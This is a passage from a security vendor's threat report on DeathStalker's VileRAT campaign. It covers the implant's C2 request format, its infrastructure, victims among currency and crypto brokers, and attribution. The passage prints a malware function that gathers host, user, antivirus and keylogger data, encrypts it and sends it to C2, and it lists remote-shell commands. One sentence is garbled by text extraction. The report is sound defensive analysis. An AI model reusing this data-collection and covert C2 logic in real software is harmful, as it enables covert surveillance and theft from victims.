request to each of the C2 servers that exist in its configuration, until one replies\nor until the list is exhausted. Environment data is embedded in a JSON dictionary, which is encrypted using RC4, encoded using the\nType B XOR algorithm, base64-encoded and URL-encoded, then finally set as the HTTP request URL path (see Figure 14);\nA C2 server may reply with an HTTP response, whose body can include an encoded and encrypted JSON array. If so, the JSON must\ncontain at least a command to execute.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n27\n\n\ndef get_request_data(req_type, xmode, pmode):\n\ndata = {\n\n'type': 'svc',\n\n'xmode': xmode,\n\n'pmode': pmode,\n\n'req_type': req_type,\n\n'svc_ver': conf.VERSION,\n\n'svc_name': conf.SVC_NAME,\n\n'ext_uuid': get_ext_uuid(),\n\n'svc_uuid': get_service_uuid(),\n\n'old_svc_uuid': get_old_service_uuid(),\n\n'host': get_hostname(),\n\n'uname': get_username(),\n\n'ia': win32.hap(),\n\n'wv': win32.gwv(),\n\n'dt': datetime.datetime.now().strftime('%Y-%m-%d %H-%M-%S'),\n\n'xn': os.path.basename(sys.executable)\n\n}\n\nif req_type == REQ_GET_CMD:\n\ndata['gc'] = global_conf\n\ndata['klr'] = keylogger.kl_run\n\ndata['cr'] = win32.is_process_exist(exe_name='chrome.exe')\n\ndata['avs'] = get_av_list()\n\nelif req_type in [REQ_FIRST_RUN, REQ_INSTALL_DONE]:\n\ndata['avs'] = get_av_list()\n\nenc_data = quote(b64encode(encrypt_xor(rc4_encrypt(json.dumps(data).encode('utf-8')))), safe=\"~()*!.'\")\n\nreturn enc_data\n\n\n**_Figure 14. VileRAT C2 request preparation function_**\n\nJust as in VileLoader, the User-Agent value in HTTP requests is randomly selected from a fixed list of possible values. The JSON that is\npassed to the C2 server can be broken down as follows:\n\n**JSON Key** **Value**\n\ntype Fixed value set to “svc”.\n\nxmode True if VileRAT is executed with the xmode command line switch; false otherwise.\n\npmode True if VileRAT is executed with the pmode command line switch; false otherwise.\n\n\n-----\n\nreq_type Internal C2 command request type, value can be get_cmd, update_done, screenshot, first_run, install_done or klgr.\n\nsvc_ver Internal VileRAT version number as set in VileRAT’s configuration.\n\nsvc_name Internal VileRAT implant name as set in VileRAT’s configuration.\n\next_uuid Partial value of one of the mutexes VileRAT sets to ensure atomic execution. It can either be the same system UUID as the\none collected by VileDropper as part of the target identifier generation, or a hard-coded one.\n\nsvc_uuid The target identifier, generated again with the same algorithm used in VileDropper.\n\nold_svc_uuid A hard-coded value, or the same system UUID as the one collected by VileDropper as part of the target identifier generation,\nbut represented using a different (and presumably older) custom algorithm.\n\nhost Hostname of the target machine.\n\nuname Username of the target.\n\nia 1 if the user running VileRAT has administrator privileges; 0 otherwise.\n\nwv Windows version, formatted as dwMajorVersion.dwMinorVersion (eg. 10.0).\n\ndt Timestamp of the HTTP request, formatted as YYYY-MM-DD HH-MM-SS.\n\nxn VileRAT’s filename.\n\navs JSON list of installed security products names (e.g., [“windows defender”, “kaspersky internet security”]), as retrieved from\nWMI by VileRAT.\n\nThe C2 answer is expected as an encoded and encrypted JSON list (leveraging the same coding and cryptographic methods as for the JSON\nin the HTTP request). Each item in the list must be a JSON dictionary that contains at least a “cmd” key. Its value can be one of: update_svc,\nssh_rshell, r_cmd, ssh_rdyn or update_conf. Additional JSON key/value pairs can exist in the dictionary and are passed to internal commands\nas parameters.\n\n## A few words about VileRAT’s infrastructure\n\nWe looked for specificities in the C2 domains we could retrieve from the samples gathered (either malicious DOCX files, DOTM files and their\nmacros, VileDropper, VileLoader or VileRAT) and that are described in this report. We ignored domains registered before mid-October 2021\nbecause most of them were already disclosed in public sources (all known malicious domains and IPs are listed in full in the indicators of\ncompromise section below). It should be noted that to date, we have identified hundreds of domains associated with VileRAT’s infection chain.\n\nThis allowed us to identify some likely VileRAT-specific infrastructure creation preferences:\n\nStarting from October 2021 at the latest, DeathStalker infrastructure IPs all belong to AS42159 (DELTAHOST UA, located in NL).\nAccording to our telemetry, DeathStalker likely started to leverage servers with IP addresses from this AS (along with others) as early as\nJune 2021;\nMalicious domain names are often batch-registered (several domains on the same day) at NAMECHEAP, Porkbun LLC or PDR Ltd.;\nA lot of malicious domain names try to masquerade as seemingly legitimate digital services providers names (such as\n“azcloudazure[.]com” or “amzbooks[.]org”), and some denote a possible attempt to leverage events of worldwide interest to conduct\nattack campaigns (such as “weareukrainepeople[.]com” or “covidsrc[.]com”);\nDomain usage seems to be separated most of the time (one domain is used only for either infection DOCX/DOTM, VileLoader or\nVileRAT), and might indicate a desire by the threat actor to tightly cluster its operations. But all those domains usually point to a very\nlimited set of IP addresses;\nA quick analysis of the characteristics of the services exposed on C2 IPs during malicious activities allowed us to note common\nsignatures: the HTTP service sends a combination of content and header values that could only be retrieved for such malicious\ninfrastructure.\n\n## VileRAT’s targets\n\nFrom August 2021 to the present day, using only data that we could check with our own telemetry, we identified 10 compromised or targeted\norganizations in Bulgaria, Cyprus, Germany, the Grenadines, Kuwait, Malta, the United Arab Emirates and the Russian Federation (see Figure\n15).\n\n\n-----\n\n**_Figure 15. Map of organizations targeted by DeathStalker’s VileRAT campaign (darker color indicates a higher concentration)_**\n\nWe could not profile all the identified organizations, but half of them were foreign currency (FOREX) and cryptocurrency exchange brokers.\nSome identified malicious documents and infrastructure domains contain (parts of) the targeted organizations’ names, and confirm this\ntargeting.\n\nIt should be noted that the identified organizations range from recent startups to established industry leaders, including dubious cryptocurrency\nexchange platforms. Locating such organizations is extremely difficult from the limited data we have at hand, because a small FOREX\ncompany might, for instance, host its infrastructure in various foreign countries, employ several remote workers from different countries, and be\nlegally based in a tax haven.\n\n## Attribution\n\nWhen we first discovered VileRAT in June 2020, we initially attributed the implant and associated infection chain to DeathStalker. This first\nattribution was mainly based on similarities with previously known EVILNUM campaigns (common specific metadata in LNK files, similar TTPs\n– notably the spear-phishing approach leveraging Google Drive files and fake personas, consistent victimology). The tie between EVILNUM\n[campaigns and DeathStalker has already been demonstrated in our previous article.](https://securelist.com/deathstalker-mercenary-triumvirate/98177/)\n\nWe still believe with high confidence that the described updated implants and associated infection chain are developed and operated by\nDeathStalker:\n\nThe main implants (VileLoader, VileRAT) that are leveraged for this campaign are updates of previously analyzed ones, and still share a\nlarge majority of code and implementation specifics with previous samples;\nThe various components of the described infection chain (DOCX, macro-enabled DOTM, VileDropper) share implementation logic and\ntechniques that have previously been leveraged by DeathStalker as part of other campaigns (PowerSing and PowerPepper notably):\n\nUsing malicious documents (fetched from emails) as an infection vector;\nSignaling infection progress and errors to remote servers;\nUsing a similarly implemented XOR algorithm for string obfuscation (in DOTM macros, and in previously documented PowerPepper\nloaders);\nLeveraging Office object properties as hidden data sources;\nUsing similarly implemented hash-like functions with a preset constant (to generate a target identifier in VileDropper, to decode an\nIP address in PowerSing).\n\n## Conclusion\n\nVileRAT, its loader and associated infection chain were continuously and frequently updated for more than two years, and are still leveraged to\npersistently target foreign currency and cryptocurrency exchange brokers, with a clear intent to escape detection.\n\nEscaping detection has always been a goal for DeathStalker, for as long as we’ve tracked the threat actor. But the VileRAT campaign took this\ndesire to another level: it is undoubtedly the most intricate, obfuscated and tentatively evasive campaign we have ever identified from this\nactor. From state-of-the-art obfuscation with VBA and JS, to multi-layered and low-level packing with Python, a robust multi-stage in-memory\n\n\n-----\n\noade, a d secu ty e do spec c eu st c bypasses, ot g as bee e t to c a ce\n\nConsidering the vast and quickly changing associated infrastructure as well, there is no doubt DeathStalker is making a tremendous effort to\ndevelop and maintain accesses. Yet, there are some glitches and inconsistencies: a final payload weighing more than 10MB (VileRAT), simple\ninfection vectors, lots of suspicious communication patterns, noisy and easily identified process executions or file deployments, as well as\nsketchy development practices leaving bugs and requiring frequent implant updates. As a result, an efficient and properly setup endpoint\nprotection solution will still be able to detect and block most of VileRAT’s related malicious activities.\n\nPutting these facts into perspective, we believe DeathStalker’s tactics and practices are nonetheless sufficient (and have proven to be) to act\non soft targets who may not be experienced enough to withstand such a level of determination, who may not have made security one of their\norganization’s top priorities, or who frequently interact with third parties that did not do so. We still, however, cannot determine what\nDeathStalker’s principal intention against such targets is: it could range from due diligence, asset recovery, information gathering in the context\nof
